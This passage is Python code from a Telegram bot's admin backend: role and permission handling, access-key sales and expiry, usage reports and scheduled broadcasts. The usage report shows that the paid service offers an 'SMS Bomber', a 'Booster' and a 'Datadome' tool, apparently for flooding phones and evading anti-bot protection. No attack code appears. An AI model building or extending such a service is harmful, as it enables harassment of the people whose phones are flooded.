    resellers = [uid for uid, r in USER_ROLES.items() if r == "reseller"]
    text = (
        f"👑 *ᴀᴅᴍɪɴ ʟɪsᴛ*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"*ᴏᴡɴᴇʀs ({len(owners)}):*\n" +
        "\n".join(f"• `{u}`" for u in owners) +
        f"\n\n*ʀᴇsᴇʟʟᴇʀs ({len(resellers)}):*\n" +
        ("\n".join(f"• `{u}`" for u in resellers) or "none") +
        f"\n\n*ᴍɪɴɪ-ᴀᴅᴍɪɴs ({len(MINI_ADMINS)}):*\n" +
        ("\n".join(f"• `{u}` — {len(p)} perms" for u, p in MINI_ADMINS.items()) or "none")
    )
    await update.effective_message.reply_text(text[:4000], parse_mode="Markdown")


# ── Handle mini-admin callback buttons ───────────────────────────────────────
async def _handle_miniadmin_callback(update: Update, context: CallbackContext, data: str):
    query = update.callback_query
    await safe_answer_callback(query)
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await safe_answer_callback(query, "❌ Owner only.", show_alert=True); return
    if data.startswith("madmin_grantall_"):
        target = int(data.split("_")[2])
        MINI_ADMINS[target] = set(ALL_PERMISSIONS)
        await query.edit_message_text(f"✅ All permissions granted to `{target}`.", parse_mode="Markdown")
    elif data.startswith("madmin_revokeall_"):
        target = int(data.split("_")[2])
        MINI_ADMINS.pop(target, None)
        await query.edit_message_text(f"🗑️ All permissions revoked from `{target}`.", parse_mode="Markdown")


# ════════════════════════════════════════════════════════════════════════════
# /helpadmin — full admin command reference
# ════════════════════════════════════════════════════════════════════════════
async def helpadmin_command(update: Update, context: CallbackContext):
    """/helpadmin — complete guide to all admin commands"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and caller not in MINI_ADMINS:
        await update.effective_message.reply_text("❌ Admin only.", parse_mode="Markdown"); return

    pages = [
        # Page 1 — User Access
        (
            "📖 *ʜᴇʟᴘᴀᴅᴍɪɴ — ᴘᴀɢᴇ 1/5 — ᴜsᴇʀ ᴀᴄᴄᴇss*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ `/approve <uid> <dur>`\n"
            "  Grant access directly to a user.\n"
            "  dur: `7d` `12h` `30m` `lifetime`\n"
            "  Example: `/approve 123456789 7d`\n\n"
            "🔑 `/genkey <dur> [count]`\n"
            "  Generate key(s) from command line.\n"
            "  Example: `/genkey 30d 5` → 5 keys, 30 days\n\n"
            "🗑️ `/delkey <KEY>`\n"
            "  Delete an access key.\n"
            "  Example: `/delkey RENZO-AB3K-9XPQ-MN7Z`\n\n"
            "🔑 `/redeem <KEY>`\n"
            "  Redeem a key as yourself.\n\n"
            "🔴 `/revoke` (menu button)\n"
            "  Revoke a user's access via the admin panel.\n\n"
            "🏷️ `/setrole` (menu button)\n"
            "  Change a user's role (user/reseller/owner)."
        ),
        # Page 2 — User Management
        (
            "📖 *ʜᴇʟᴘᴀᴅᴍɪɴ — ᴘᴀɢᴇ 2/5 — ᴜsᴇʀ ᴍɢᴍᴛ*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ `/warn <uid> [reason]`\n"
            "  Warn a user. Auto-bans at 3 warnings.\n"
            "  Example: `/warn 123456789 spamming`\n\n"
            "📋 `/warnings <uid>`\n"
            "  View all warnings for a user.\n\n"
            "🧹 `/clearwarn <uid>`\n"
            "  Clear all warnings for a user.\n\n"
            "🚫 `/ban <uid> [reason]`\n"
            "  Ban a user from the bot.\n\n"
            "✅ `/unban <uid>`\n"
            "  Unban a user.\n\n"
            "📋 `/bans`\n"
            "  List all banned users.\n\n"
            "📝 `/setnote <uid> <text>`\n"
            "  Add a private note to a user's profile.\n"
            "  Example: `/setnote 123456789 VIP client`\n\n"
            "📋 `/notes [uid]`\n"
            "  List notes. If uid given, show that user's notes.\n\n"
            "🗑️ `/delnote <uid>`\n"
            "  Delete all notes for a user.\n\n"
            "🔍 `/lookup <uid>`\n"
            "  Full profile: role, access, stats, notes, warnings.\n\n"
            "📊 `/userinfo <uid>`\n"
            "  Quick summary card for a user."
        ),
        # Page 3 — Stats & Monitoring
        (
            "📖 *ʜᴇʟᴘᴀᴅᴍɪɴ — ᴘᴀɢᴇ 3/5 — sᴛᴀᴛs & ᴍᴏɴɪᴛᴏʀ*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ `/activeusers`\n"
            "  List all users with active (non-expired) access.\n\n"
            "⏳ `/expiring`\n"
            "  List users whose access expires in the next 48h.\n\n"
            "📊 `/globalstats`\n"
            "  Full bot-wide counters: keys, files, attacks, etc.\n\n"
            "🟢 `/status`\n"
            "  Quick status: uptime, users, keys, maintenance.\n\n"
            "🏓 `/ping`\n"
            "  Check bot latency.\n\n"
            "💬 `/feedbacks`\n"
            "  View the last 20 user feedbacks.\n\n"
            "📂 `/backup`\n"
            "  Download access.json + referrals.json right now.\n"
            "  (Auto-backup also runs daily to your DM.)"
        ),
        # Page 4 — Mini-Admin & Permissions
        (
            "📖 *ʜᴇʟᴘᴀᴅᴍɪɴ — ᴘᴀɢᴇ 4/5 — ᴍɪɴɪ-ᴀᴅᴍɪɴ*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Mini-admins are users you trust with *specific* commands.\n"
            "They cannot see the admin panel — only run their allowed commands.\n\n"
            "👑 `/miniadmin [uid]`\n"
            "  List all mini-admins, or view one user's permissions.\n\n"
            "➕ `/setperm <uid> <perm|all>`\n"
            "  Grant a permission to a mini-admin.\n"
            "  Example: `/setperm 123456789 genkey`\n"
            "  Use `all` to grant everything.\n\n"
            "🗑️ `/rmperm <uid> [perm|all]`\n"
            "  Revoke a permission. Use `all` to remove the mini-admin.\n\n"
            "📋 `/listadmins`\n"
            "  List owners, resellers, and mini-admins.\n\n"
            "*Available permissions:*\n"
            f"`{'`, `'.join(ALL_PERMISSIONS)}`"
        ),
        # Page 5 — Maintenance & Tools
        (
            "📖 *ʜᴇʟᴘᴀᴅᴍɪɴ — ᴘᴀɢᴇ 5/5 — ᴍᴀɪɴᴛ & ᴛᴏᴏʟs*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔧 `/setquota <uid> <limit>`\n"
            "  Override a user's daily file-generation limit.\n"
            "  Example: `/setquota 123456789 10`\n\n"
            "🔄 `/resetstats <uid>`\n"
            "  Reset a user's daily usage counters.\n\n"
            "🔓 `/clearlocks`\n"
            "  Clear all brute-force key lockouts.\n\n"
            "📣 `/broadcast <message>`\n"
            "  Quick broadcast without going through the menu.\n\n"
            "📥 `/addtool`\n"
            "  Upload a file to the tools list (send file after command).\n\n"
            "🗑️ `/removetool <filename>`\n"
            "  Remove a tool by filename.\n\n"
            "🛠️ Maintenance toggle\n"
            "  Use the Admin Panel → Maintenance Mode button.\n\n"
            "📢 Channel requirement\n"
            "  Set REQUIRED_CHANNEL in config at top of file."
        ),
    ]

    # Store pages in context for pagination
    context.user_data["helpadmin_pages"] = pages
    context.user_data["helpadmin_page"] = 0

    keyboard = [[
        InlineKeyboardButton("▶️ ɴᴇxᴛ", callback_data="helpadmin_page_1"),
        InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="helpadmin_close"),
    ]]
    await update.effective_message.reply_text(pages[0], parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard))


async def _handle_helpadmin_callback(update: Update, context: CallbackContext, data: str):
    query = update.callback_query
    await safe_answer_callback(query)
    if data == "helpadmin_close":
        await query.delete_message(); return
    try:
        page = int(data.split("_")[2])
    except (IndexError, ValueError):
        return
    pages = context.user_data.get("helpadmin_pages", [])
    if not pages or page >= len(pages):
        return
    kb = []
    row = []
    if page > 0:
        row.append(InlineKeyboardButton("◀️ ᴘʀᴇᴠ", callback_data=f"helpadmin_page_{page-1}"))
    if page < len(pages) - 1:
        row.append(InlineKeyboardButton("▶️ ɴᴇxᴛ", callback_data=f"helpadmin_page_{page+1}"))
    row.append(InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="helpadmin_close"))
    kb.append(row)
    await query.edit_message_text(pages[page], parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb))


# ════════════════════════════════════════════════════════════════════════════
# /userinfo — quick user summary card
# ════════════════════════════════════════════════════════════════════════════
async def userinfo_command(update: Update, context: CallbackContext):
    """/userinfo <uid> — quick summary card for a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "lookup"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/userinfo <user_id>`", parse_mode="Markdown"); return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return

    now_ts = time.time()
    role = USER_ROLES.get(target, "user")
    access = USER_ACCESS.get(target)
    stats = USER_STATS.get(target, {})
    warns = len(USER_WARNINGS.get(target, []))
    notes = len(USER_NOTES.get(target, []))
    is_banned = target in BANNED_USERS
    quota = USER_QUOTAS.get(target, "default")
    mini_perms = MINI_ADMINS.get(target)

    if access is None and target in USER_ACCESS:
        access_str = "♾️ Lifetime"
    elif access and access > now_ts:
        days_left = int((access - now_ts) / 86400)
        exp_date  = datetime.datetime.fromtimestamp(access).strftime("%b %d, %Y %H:%M")
        access_str = f"✅ {days_left}d left (exp {exp_date})"
    else:
        access_str = "❌ Expired / No access"

    text = (
        f"╔══════════════════════════╗\n"
        f"║  🔍  ᴜsᴇʀ ɪɴғᴏ ᴄᴀʀᴅ  ║\n"
        f"╚══════════════════════════╝\n\n"
        f"👤 ᴜsᴇʀ ɪᴅ  : `{target}`\n"
        f"🏷️ ʀᴏʟᴇ     : `{role}`\n"
        f"🚫 ʙᴀɴɴᴇᴅ   : {'Yes 🚫' if is_banned else 'No ✅'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 ᴀᴄᴄᴇss   : {access_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 ɢᴇɴs      : *{stats.get('generations', 0):,}*\n"
        f"⚠️ ᴡᴀʀɴs    : *{warns}/{WARNING_THRESHOLD}*\n"
        f"📝 ɴᴏᴛᴇs    : *{notes}*\n"
        f"📦 ǫᴜᴏᴛᴀ    : *{quota}*\n"
        f"👑 ᴍɪɴɪ-ᴀᴅᴍɪɴ: {'Yes (' + str(len(mini_perms)) + ' perms)' if mini_perms else 'No'}\n"
        f"🕐 ʟᴀsᴛ ᴀᴄᴛɪᴠᴇ: {stats.get('last_active', 'N/A')[:16] if stats.get('last_active') else 'N/A'}"
    )
    keyboard = [
        [InlineKeyboardButton("⚠️ ᴡᴀʀɴ", callback_data=f"quick_warn_{target}"),
         InlineKeyboardButton("🚫 ʙᴀɴ", callback_data=f"quick_ban_{target}"),
         InlineKeyboardButton("📝 ɴᴏᴛᴇ", callback_data=f"quick_note_{target}")],
    ]
    await update.effective_message.reply_text(text, parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard))


# ════════════════════════════════════════════════════════════════════════════
# /delnote — delete notes for a user
# ════════════════════════════════════════════════════════════════════════════
async def delnote_command(update: Update, context: CallbackContext):
    """/delnote <user_id> — delete all notes for a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "notes"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/delnote <user_id>`", parse_mode="Markdown"); return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return
    removed = len(USER_NOTES.pop(target, []))
    await update.effective_message.reply_text(f"🗑️ Deleted *{removed}* note(s) for `{target}`.", parse_mode="Markdown")


# ════════════════════════════════════════════════════════════════════════════
# USER QoL FEATURES
# ════════════════════════════════════════════════════════════════════════════

async def show_my_stats_inline(update: Update, context: CallbackContext):
    """Inline version of show_stats callable from callback."""
    await show_stats(update, context)



# NEW FEATURES — v2.3.0
# ══════════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────────────────
# SECURITY: /blacklistkey <key> — instantly invalidate a leaked key
# ─────────────────────────────────────────────────────────────────────────────
async def blacklistkey_command(update: Update, context: CallbackContext):
    """/blacklistkey <key> — blacklist a key so it can never be redeemed"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text(
            "ᴜsᴀɢᴇ: `/blacklistkey RENZO-XXXX-XXXX`\n\n"
            "This instantly voids the key — anyone who tries to redeem it gets blocked.",
            parse_mode="Markdown"
        ); return

    key = context.args[0].strip().upper()
    BLACKLISTED_KEYS.add(key)
    # Also remove from active keys if it's there
    was_active = key in ACCESS_KEYS
    ACCESS_KEYS.pop(key, None)
    schedule_save()
    await update.effective_message.reply_text(
        f"🚫 *Key Blacklisted*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 `{key}`\n"
        f"{'⚠️ Also removed from active keys.' if was_active else 'ℹ️ Was not in active key pool.'}\n"
        f"Any redemption attempt with this key will now be blocked.",
        parse_mode="Markdown"
    )
    await log_to_channel(context.bot, f"🚫 BLACKLIST KEY `{key}` by `{caller}`")


# ─────────────────────────────────────────────────────────────────────────────
# KEY SYSTEM: /extend <user_id> <duration> — add time on top of existing access
# ─────────────────────────────────────────────────────────────────────────────
async def extend_command(update: Update, context: CallbackContext):
    """/extend <user_id> <duration> — extend access without replacing it"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "approve"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if len(context.args or []) < 2:
        await update.effective_message.reply_text(
            "ᴜsᴀɢᴇ: `/extend <user_id> <Nd|Nh|Nm>`\n\n"
            "Example: `/extend 123456789 7d` adds 7 days on top of existing access.\n"
            "Unlike /approve this does NOT replace — it adds.",
            parse_mode="Markdown"
        ); return

    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return

    dur = context.args[1].strip().lower()
    now_ts = time.time()

    if dur.endswith("d"):
        delta_secs = int(dur[:-1]) * 86400; label = dur
    elif dur.endswith("h"):
        delta_secs = int(dur[:-1]) * 3600;  label = dur
    elif dur.endswith("m"):
        delta_secs = int(dur[:-1]) * 60;    label = dur
    else:
        await update.effective_message.reply_text("❌ Use: `7d`, `12h`, or `30m`", parse_mode="Markdown"); return

    # Extend: start from current expiry or now, whichever is later
    current_exp = USER_ACCESS.get(target)
    if current_exp is None and target in USER_ACCESS:
        await update.effective_message.reply_text(
            f"ℹ️ User `{target}` has *lifetime* access — extension not needed.",
            parse_mode="Markdown"
        ); return
    elif current_exp and current_exp > now_ts:
        new_exp = current_exp + delta_secs
        base_str = f"was expiring {datetime.datetime.fromtimestamp(current_exp).strftime('%b %d %H:%M')}"
    else:
        new_exp = now_ts + delta_secs
        base_str = "had no/expired access"

    USER_ACCESS[target] = new_exp
    USER_ROLES.setdefault(target, "user")
    schedule_save()

    new_exp_str = datetime.datetime.fromtimestamp(new_exp).strftime("%b %d, %Y %H:%M")
    await update.effective_message.reply_text(
        f"✅ *Access Extended*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 `{target}`\n"
        f"➕ Added: `{label}`\n"
        f"📅 New expiry: `{new_exp_str}`\n"
        f"ℹ️ Previously: {base_str}",
        parse_mode="Markdown"
    )
    try:
        await context.bot.send_message(
            target,
            f"🎉 *Access Extended!*\n"
            f"+{label} added to your account.\n"
            f"⏳ New expiry: `{new_exp_str}`",
            parse_mode="Markdown"
        )
    except Exception:
        pass
    await log_to_channel(context.bot, f"➕ EXTEND `{target}` +{label} by `{caller}`")


# ─────────────────────────────────────────────────────────────────────────────
# KEY SYSTEM: /keylog — see who redeemed what key and when
# ─────────────────────────────────────────────────────────────────────────────
async def keylog_command(update: Update, context: CallbackContext):
    """/keylog [N] — show last N key redemptions (default 20)"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    n = 20
    if context.args:
        try:
            n = max(1, min(50, int(context.args[0])))
        except ValueError:
            pass

    log = KEY_REDEMPTION_LOG[-n:]
    if not log:
        await update.effective_message.reply_text("📋 No key redemptions recorded yet.", parse_mode="Markdown"); return

    lines = [f"📋 *Last {len(log)} Key Redemptions*\n━━━━━━━━━━━━━━━━━━━━"]
    for entry in reversed(log):
        lines.append(
            f"🔑 `{entry['key']}`\n"
            f"   👤 `{entry['user_id']}` ({escape_md(str(entry.get('username', '?')))})\n"
            f"   📅 {entry['ts']}"
        )

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    await update.effective_message.reply_text(text, parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# KEY SYSTEM: /exportkeys — bulk export all active keys as CSV to your DM
# ─────────────────────────────────────────────────────────────────────────────
async def exportkeys_command(update: Update, context: CallbackContext):
    """/exportkeys — send all active (unredeemed) keys as a CSV to admin DM"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    if not ACCESS_KEYS:
        await update.effective_message.reply_text("🔑 No active keys in the pool.", parse_mode="Markdown"); return

    import io
    import csv

    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(["key", "days", "max_uses", "use_count", "category", "created_by", "created_at"])
    for key, data in ACCESS_KEYS.items():
        writer.writerow([
            key,
            data.get("days", "?"),
            data.get("max_uses", 1),
            data.get("use_count", 0),
            data.get("category", "standard"),
            data.get("created_by", "?"),
            data.get("created_at", "?"),
        ])

    buf.seek(0)
    csv_bytes = buf.getvalue().encode("utf-8")
    now_str = datetime.datetime.now().strftime("%Y%m%d_%H%M")
    await context.bot.send_document(
        chat_id=caller,
        document=InputFile(io.BytesIO(csv_bytes), filename=f"keys_{now_str}.csv"),
        caption=f"🔑 Active keys export — {len(ACCESS_KEYS)} keys\n📅 {now_str}",
    )
    await update.effective_message.reply_text(f"✅ CSV sent to your DM ({len(ACCESS_KEYS)} keys).", parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# KEY SYSTEM: /setkeycat <key> <trial|standard|vip> — tag a key with a category
# ─────────────────────────────────────────────────────────────────────────────
async def setkeycat_command(update: Update, context: CallbackContext):
    """/setkeycat <key> <trial|standard|vip> — set the category tag on a key"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if len(context.args or []) < 2:
        await update.effective_message.reply_text(
            "ᴜsᴀɢᴇ: `/setkeycat <key> <trial|standard|vip>`",
            parse_mode="Markdown"
        ); return

    key = context.args[0].strip().upper()
    cat = context.args[1].strip().lower()
    if cat not in KEY_CATEGORIES:
        await update.effective_message.reply_text(
            f"❌ Invalid category. Use: `{'`, `'.join(KEY_CATEGORIES)}`",
            parse_mode="Markdown"
        ); return
    if key not in ACCESS_KEYS:
        await update.effective_message.reply_text(f"❌ Key `{key}` not found.", parse_mode="Markdown"); return

    ACCESS_KEYS[key]["category"] = cat
    schedule_save()
    await update.effective_message.reply_text(
        f"✅ Key `{key}` → category set to `{cat}`.", parse_mode="Markdown"
    )


# ─────────────────────────────────────────────────────────────────────────────
# ANALYTICS: /usagereport — daily/weekly usage breakdown sent to admin
# ─────────────────────────────────────────────────────────────────────────────
async def usagereport_command(update: Update, context: CallbackContext):
    """/usagereport — detailed tool usage report"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    now = time.time()
    now_ts = int(now)
    one_day_ago  = now_ts - 86400
    one_week_ago = now_ts - 604800

    def count_in_window(tool, since):
        total = 0
        for hour_ts, cnt in TOOL_HOURLY_USAGE.get(tool, {}).items():
            if int(hour_ts) >= since:
                total += cnt
        return total

    tools = ["generate", "sms_bomb", "boost", "encrypt", "datadome"]
    tool_labels = {
        "generate": "📂 DB Generate",
        "sms_bomb": "💣 SMS Bomber",
        "boost":    "🚀 Booster",
        "encrypt":  "🔐 Encryptor",
        "datadome": "🛡️ Datadome",
    }

    # Peak hour detection (last 7 days)
    hour_totals: dict = {}
    for tool in tools:
        for hour_ts, cnt in TOOL_HOURLY_USAGE.get(tool, {}).items():
            if int(hour_ts) >= one_week_ago:
                hour_totals[int(hour_ts)] = hour_totals.get(int(hour_ts), 0) + cnt

    peak_hour_ts = max(hour_totals, key=hour_totals.get) if hour_totals else None
    peak_str = (
        datetime.datetime.fromtimestamp(peak_hour_ts).strftime("%a %b %d %H:00")
        if peak_hour_ts else "N/A"
    )

    lines = [
        "📊 *Usage Report*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"📅 Generated: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`",
        "",
        "*Per-Tool Usage*",
        "```",
        f"{'Tool':<18} {'24h':>5} {'7d':>6} {'All':>7}",
        "─" * 38,
    ]
    for tool in tools:
        d = count_in_window(tool, one_day_ago)
        w = count_in_window(tool, one_week_ago)
        a = GLOBAL_STATS.get(f"total_{tool}_uses", 0)
        lines.append(f"{tool_labels[tool]:<18} {d:>5} {w:>6} {a:>7}")
    lines.append("```")

    # Active user breakdown
    active_24h = 0
    for _uid, _stats in USER_STATS.items():
        _la = _stats.get("last_active")
        if _la:
            try:
                if (now - datetime.datetime.fromisoformat(_la).timestamp()) < 86400:
                    active_24h += 1
            except Exception:
                pass

    lines += [
        "",
        "*User Activity*",
        f"👥 Total users:     `{len(USER_ACCESS)}`",
        f"✅ Active users:    `{sum(1 for e in USER_ACCESS.values() if e is None or e > now)}`",
        f"⚡ Active (24h):    `{active_24h}`",
        f"⏰ Peak hour (7d):  `{peak_str}`",
        "",
        f"🔑 Keys redeemed (all time): `{GLOBAL_STATS.get('total_keys_redeemed', 0)}`",
        f"📂 Files generated (all time): `{GLOBAL_STATS.get('total_files_generated', 0)}`",
    ]

    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# ANALYTICS: /inactive — list users not active in the last N days
# ─────────────────────────────────────────────────────────────────────────────
async def inactive_command(update: Update, context: CallbackContext):
    """/inactive [days] — list users not active in last N days (default 7)"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    days = INACTIVE_DAYS_THRESHOLD
    if context.args:
        try:
            days = max(1, int(context.args[0]))
        except ValueError:
            pass

    cutoff = time.time() - (days * 86400)
    inactive = []
    for uid, stats in USER_STATS.items():
        last = stats.get("last_active")
        if not last:
            inactive.append((uid, "never"))
            continue
        try:
            last_ts = datetime.datetime.fromisoformat(last).timestamp()
            if last_ts < cutoff:
                inactive.append((uid, last[:10]))
        except Exception:
            inactive.append((uid, "unknown"))

    if not inactive:
        await update.effective_message.reply_text(
            f"✅ All users were active in the last {days} days.", parse_mode="Markdown"
        ); return

    lines = [f"😴 *Inactive Users (>{days} days)*\n━━━━━━━━━━━━━━━━━━━━"]
    for uid, last in inactive[:40]:
        has_acc = "✅" if has_access(uid) else "❌"
        lines.append(f"{has_acc} `{uid}` — last: `{last}`")
    if len(inactive) > 40:
        lines.append(f"…and {len(inactive)-40} more")

    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN QoL: /schedannounce <delay_minutes> <message> — scheduled broadcast
# ─────────────────────────────────────────────────────────────────────────────
async def schedannounce_command(update: Update, context: CallbackContext):
    """/schedannounce <minutes> <message> — schedule an announcement"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if len(context.args or []) < 2:
        await update.effective_message.reply_text(
            "ᴜsᴀɢᴇ: `/schedannounce <minutes> <message text>`\n\n"
            "Example: `/schedannounce 60 Maintenance starts in 1 hour!`\n"
            "Use `/listschedule` to see pending announcements.\n"
            "Use `/cancelschedule <index>` to cancel one.",
            parse_mode="Markdown"
        ); return

    try:
        delay_mins = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ First argument must be minutes (integer).", parse_mode="Markdown"); return

    text = " ".join(context.args[1:])
    send_at = time.time() + (delay_mins * 60)
    send_at_str = datetime.datetime.fromtimestamp(send_at).strftime("%Y-%m-%d %H:%M")

    entry = {"text": text, "send_at": send_at, "by": caller, "created": time.time()}
    SCHEDULED_ANNOUNCEMENTS.append(entry)

    # Schedule the actual job
    async def _do_send(ctx):
        if entry not in SCHEDULED_ANNOUNCEMENTS:
            return  # was cancelled
        SCHEDULED_ANNOUNCEMENTS.remove(entry)
        import telegram.error as _tge
        sent = failed = 0
        safe_text = escape_md(text)
        for uid in list(USER_ACCESS.keys()):
            while True:
                try:
                    await ctx.bot.send_message(
                        int(uid),
                        f"📢 *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs*\n━━━━━━━━━━━━━━━━━━━━\n\n{safe_text}\n\n━━━━━━━━━━━━━━━━━━━━\n📞 @ZyronDevv",
                        parse_mode="Markdown"
                    )
                    sent += 1
                    await asyncio.sleep(0.05)
                    break
                except _tge.RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 1)
                except Exception:
                    failed += 1
                    break
        try:
            await ctx.bot.send_message(
                ADMIN_ID,
                f"✅ *Scheduled Announcement Sent*\n"
                f"📊 Sent: {sent} | Failed: {failed}\n"
                f"📝 Text: {text[:100]}{'...' if len(text) > 100 else ''}",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    # Use job_queue to fire after delay
    context.application.job_queue.run_once(_do_send, when=delay_mins * 60)

    await update.effective_message.reply_text(
        f"⏰ *Announcement Scheduled*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 Will send at: `{send_at_str}`\n"
        f"⏳ In: `{delay_mins} minutes`\n"
        f"📝 Message: `{text[:80]}{'...' if len(text) > 80 else ''}`\n\n"
        f"Use /listschedule to manage.",
        parse_mode="Markdown"
    )


async def listschedule_command(update: Update, context: CallbackContext):
    """/listschedule — show all pending scheduled announcements"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    if not SCHEDULED_ANNOUNCEMENTS:
        await update.effective_message.reply_text("📭 No scheduled announcements.", parse_mode="Markdown"); return

    lines = ["⏰ *Scheduled Announcements*\n━━━━━━━━━━━━━━━━━━━━"]
    for i, entry in enumerate(SCHEDULED_ANNOUNCEMENTS):
        send_at_str = datetime.datetime.fromtimestamp(entry["send_at"]).strftime("%b %d %H:%M")
        mins_left = max(0, int((entry["send_at"] - time.time()) / 60))
        lines.append(
            f"`[{i}]` 📅 `{send_at_str}` ({mins_left}m left)\n"
            f"   📝 {entry['text'][:60]}{'...' if len(entry['text']) > 60 else ''}"
        )
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cancelschedule_command(update: Update, context: CallbackContext):
    """/cancelschedule <index> — cancel a scheduled announcement by index"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/cancelschedule <index>`", parse_mode="Markdown"); return
    try:
        idx = int(context.args[0])
        entry = SCHEDULED_ANNOUNCEMENTS.pop(idx)
        await update.effective_message.reply_text(
            f"❌ Cancelled scheduled announcement #{idx}:\n`{entry['text'][:100]}`",
            parse_mode="Markdown"
        )
    except (ValueError, IndexError):
        await update.effective_message.reply_text("❌ Invalid index. Use /listschedule to see valid indices.", parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN QoL: /undodelkey — restore the last deleted key (30-min grace window)
# ─────────────────────────────────────────────────────────────────────────────
async def undodelkey_command(update: Update, context: CallbackContext):
    """/undodelkey — restore the last deleted key within 30 minutes"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    if not _DELETED_KEY_UNDO:
        await update.effective_message.reply_text("📭 No recently deleted key to restore.", parse_mode="Markdown"); return

    elapsed = time.time() - _DELETED_KEY_UNDO["ts"]
    if elapsed > KEY_UNDO_GRACE_SECS:
        await update.effective_message.reply_text(
            f"⌛ Grace window expired ({int(elapsed/60)}m ago). Cannot restore.",
            parse_mode="Markdown"
        ); return

    key  = _DELETED_KEY_UNDO["key"]
    data = _DELETED_KEY_UNDO["data"]
    ACCESS_KEYS[key] = data
    _DELETED_KEY_UNDO.clear()
    schedule_save()
    await update.effective_message.reply_text(
        f"✅ *Key Restored*\n🔑 `{key}`\nKey is active again.",
        parse_mode="Markdown"
    )


# ─────────────────────────────────────────────────────────────────────────────
# BOT HEALTH: /bothealth — CPU, memory, uptime, error count
# ─────────────────────────────────────────────────────────────────────────────
async def bothealth_command(update: Update, context: CallbackContext):
    """/bothealth — show bot resource usage and health summary"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return

    try:
        import psutil
        proc = psutil.Process()
        cpu_pct  = psutil.cpu_percent(interval=1)
        mem      = psutil.virtual_memory()
        mem_pct  = mem.percent
        mem_used = mem.used // (1024 * 1024)
        mem_total= mem.total // (1024 * 1024)
        rss_mb   = proc.memory_info().rss // (1024 * 1024)

